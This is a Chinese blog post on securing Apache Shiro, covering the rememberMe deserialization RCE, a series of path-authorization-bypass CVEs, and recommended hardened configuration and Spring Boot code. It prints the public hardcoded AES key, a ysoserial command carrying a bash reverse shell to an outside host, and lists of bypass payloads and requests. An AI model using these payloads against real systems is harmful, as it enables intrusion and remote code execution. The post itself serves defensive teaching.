---
layout: post
title: "Apache Shiro 安全配置与防护实践"
date: 2026-05-08 12:00:00 +0800
categories: 
  - Java安全
  - Shiro
tags: 
  - Apache Shiro
  - 认证授权
  - rememberMe
  - 反序列化
  - 路径绕过
  - 代码审计
series: Java Web 认证授权安全系列
series_order: 3
---

# Apache Shiro 安全配置与防护实践

Apache Shiro 因其轻量级和 API 简洁广受青睐，但从 2016 年的 rememberMe RCE (CVSS 9.8) 到 2023 年的路径绕过，历史上的漏洞均属于"一击必杀"级别。

> 本文是 [Java Web 认证授权安全系列](/2026/05/07/java-web-auth-overview/) 的第三篇。

---

## 3.1 rememberMe 反序列化 RCE（CVE-2016-4437，CVSS 9.8）

这是 Shiro 最臭名昭著的漏洞，至今仍有公网系统未修复。

**漏洞原理**：Shiro 1.2.4 及之前版本的 rememberMe 功能使用 **硬编码的 AES 密钥**：

```java
// Shiro 1.2.4 源码 — 全网公开的硬编码密钥
private static final byte[] DEFAULT_CIPHER_KEY_BYTES = 
    Base64.decode("kPH+bIxk5D2deZiIxcaaaA==");
```

**攻击链**：

```
1. 攻击者使用已知密钥加密恶意序列化对象（CommonsCollections 链）
2. 将 payload 作为 rememberMe Cookie 发送
3. Shiro 解密 → 反序列化 → RCE
```

**利用工具**：

```bash
# ysoserial 生成 payload
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections2 \
  "bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'"

# Shiro 漏洞检测
python3 shiro_attack.py -u https://target.com -k "kPH+bIxk5D2deZiIxcaaaA=="
```

**SHIRO-721（Padding Oracle 攻击）**：即使配置了自定义密钥（1.2.5 ~ 1.4.1），攻击者仍可通过 AES-CBC Padding Oracle 构造恶意 Cookie，无需知道密钥。影响版本 < 1.4.2。

**防御**：

```ini
# shiro.ini — 禁用 rememberMe
[main]
securityManager.rememberMeManager = null
```

```java
// Java Config — 使用随机强密钥
@Bean
public RememberMeManager rememberMeManager() {
    CookieRememberMeManager manager = new CookieRememberMeManager();
    KeyGenerator keyGen = KeyGenerator.getInstance("AES");
    keyGen.init(256);
    manager.setCipherKey(keyGen.generateKey().getEncoded());
    return manager;
}
```

**必须升级到 Shiro 1.13.0+ 或 2.0.0-alpha-4+**。

---

## 3.2 路径鉴权绕过系列

Shiro 的路径匹配与 Spring/Tomcat 解析不一致，导致了一系列绕过：

| CVE | 版本 | Payload | 原理 |
|------|------|----------|------|
| CVE-2020-1957 | < 1.5.2 | `/admin/..;/` | `..;` 解析差异 |
| CVE-2020-11989 | < 1.5.3 | `/admin/page%2f` | 编码斜杠 |
| CVE-2020-13933 | < 1.6.0 | `/admin/%3bindex` | 分号编码 |
| CVE-2020-17523 | < 1.7.1 | `/admin/%20/` | 空格编码 |
| CVE-2021-41303 | < 1.8.0 | `/admin/a%2e%2e%2f` | 双重编码 |
| CVE-2022-32532 | < 1.9.1 | `/admin/;/` | 正则绕过 |
| CVE-2023-22602 | < 1.11.0 | `/admin/%0d` | 换行符 |

**通用 Payload**：

```http
GET /admin/;/users HTTP/1.1
GET /admin;.js HTTP/1.1
GET /admin%2fusers HTTP/1.1
GET /public/../admin/users HTTP/1.1
```

**防御**：升级到 Shiro 1.11.0+，启用路径规范化。

---

## 3.3 Shiro 安全配置推荐

```ini
# shiro.ini
[main]
securityManager.rememberMeManager = null  # 或使用随机强密钥
securityManager.sessionManager.sessionIdCookie.secure = true
securityManager.sessionManager.sessionIdCookie.httpOnly = true
securityManager.sessionManager.sessionIdCookie.sameSite = Strict
securityManager.sessionManager.globalSessionTimeout = 1800000

[urls]
/login = anon
/logout = logout
/api/public/** = anon
/api/admin/** = authc, roles[admin]
/api/user/** = authc
/** = authc
```

---

## 3.4 Shiro + Spring Boot 完整集成（补充）

```java
@Configuration
public class ShiroConfig {

    @Bean
    public ShiroFilterFactoryBean shiroFilter(SecurityManager securityManager) {
        ShiroFilterFactoryBean factory = new ShiroFilterFactoryBean();
        factory.setSecurityManager(securityManager);
        factory.setLoginUrl("/login");
        factory.setUnauthorizedUrl("/403");

        // 过滤器链 — 顺序敏感，精细在前
        Map<String, String> filterChain = new LinkedHashMap<>();
        filterChain.put("/login", "anon");
        filterChain.put("/api/public/**", "anon");
        filterChain.put("/api/admin/**", "authc,roles[admin]");
        filterChain.put("/api/user/**", "authc");
        filterChain.put("/**", "authc");
        factory.setFilterChainDefinitionMap(filterChain);
        return factory;
    }

    @Bean
    public DefaultWebSecurityManager securityManager(MyRealm realm) {
        DefaultWebSecurityManager manager = new DefaultWebSecurityManager();
        manager.setRealm(realm);
        // 关键：禁用或加固 rememberMe
        manager.setRememberMeManager(null);
        return manager;
    }

    @Bean
    public MyRealm myRealm() {
        MyRealm realm = new MyRealm();
        realm.setCredentialsMatcher(hashedCredentialsMatcher());
        return realm;
    }

    @Bean
    public HashedCredentialsMatcher hashedCredentialsMatcher() {
        HashedCredentialsMatcher matcher = new HashedCredentialsMatcher();
        matcher.setHashAlgorithmName("SHA-256");
        matcher.setHashIterations(1024);
        matcher.setStoredCredentialsHexEncoded(true);
        return matcher;
    }
}
```

---

## 3.5 自定义 Realm 实现（补充）

```java
public class MyRealm extends AuthorizingRealm {

    @Autowired
    private UserService userService;
    @Autowired
    private PermissionService permissionService;

    // 认证：验证用户名密码
    @Override
    protected AuthenticationInfo doGetAuthenticationInfo(
            AuthenticationToken token) throws AuthenticationException {
        
        String username = (String) token.getPrincipal();
        User user = userService.findByUsername(username);
        if (user == null) {
            throw new UnknownAccountException("用户不存在");
        }
        if (!user.isEnabled()) {
            throw new LockedAccountException("账号已禁用");
        }
        
        // 返回认证信息，Shiro 自动校验密码
        return new SimpleAuthenticationInfo(
            user,                    // principal
            user.getPassword(),      // hashed password
            ByteSource.Util.bytes(user.getSalt()),
            getName()                // realm name
        );
    }

    // 授权：加载用户权限和角色
    @Override
    protected AuthorizationInfo doGetAuthorizationInfo(
            PrincipalCollection principals) {
        
        User user = (User) principals.getPrimaryPrincipal();
        SimpleAuthorizationInfo info = new SimpleAuthorizationInfo();
        
        // 角色
        Set<String> roles = userService.getRoles(user.getId());
        info.setRoles(roles);
        
        // 权限字符串
        Set<String> permissions = permissionService.getPermissions(user.getId());
        info.setStringPermissions(permissions);
        
        return info;
    }
}
```

**使用注解**：

```java
@RestController
@RequestMapping("/api/admin")
public class AdminController {

    @RequiresRoles("admin")
    @GetMapping("/users")
    public List<User> getUsers() { }

    @RequiresPermissions("circle:admin:delete")
    @DeleteMapping("/circle/{id}")
    public void deleteCircle(@PathVariable Long id) { }
}
```

---

## 3.6 Shiro vs Spring Security 选型对比（补充）

| 维度 | Apache Shiro | Spring Security |
|------|-------------|-----------------|
| **学习曲线** | 低，配置直观 | 高，概念多 |
| **Spring 集成** | 需额外配置 | 原生集成 |
| **粒度** | URL 级别为主 | URL + 方法 + 资源实例 |
| **Session 管理** | 内置，成熟 | 依赖 Spring Session |
| **OAuth2/OIDC** | 需第三方扩展 | 开箱即用 |
| **社区生态** | 较小 | 极其庞大 |
| **更新频率** | 较慢 | 非常活跃 |
| **历史漏洞** | rememberMe RCE(9.8)、路径绕过 | BCrypt 截断(7.5)、Actuator 绕过(7.3) |
| **适用场景** | 非 Spring 项目、遗留系统、简单权限模型 | Spring 项目、微服务、OAuth2 |

**选型建议**：

| 场景 | 推荐 |
|------|------|
| 新项目、Spring Boot 技术栈 | Spring Security |
| 非 Spring 项目（纯 Servlet） | Apache Shiro |
| 需要 OAuth2 / SAML / OIDC | Spring Security |
| 简单权限模型 + 快速集成 | Apache Shiro |
| 遗留 Shiro 项目 | 升级到最新版本 + 加固配置 |

---

## 总结

Shiro 的安全防护核心就两点：

1. **版本**：1.2.4 的 rememberMe RCE 是 CVSS 9.8 级别，必须升级
2. **路径**：Shiro 的路径匹配与 Spring 不一致是绕过的根源，升级 + 路径规范化是正解

如果系统使用 Shiro，立即检查版本号 — 低于 1.11.0 的路径绕过能被自动化扫描工具在 5 分钟内发现。

---

**系列文章**：
- [概览篇](/2026/05/07/java-web-auth-overview/)
- [Spring Security 安全配置篇](/2026/05/08/spring-security-security-practice/)
- [JWT 认证安全篇](/2026/05/08/jwt-security-practice/)
- [鉴权绕过模式篇](/2026/05/08/java-web-auth-bypass/)
- [会话管理与 Redis 认证篇](/2026/05/08/java-session-redis-auth/)
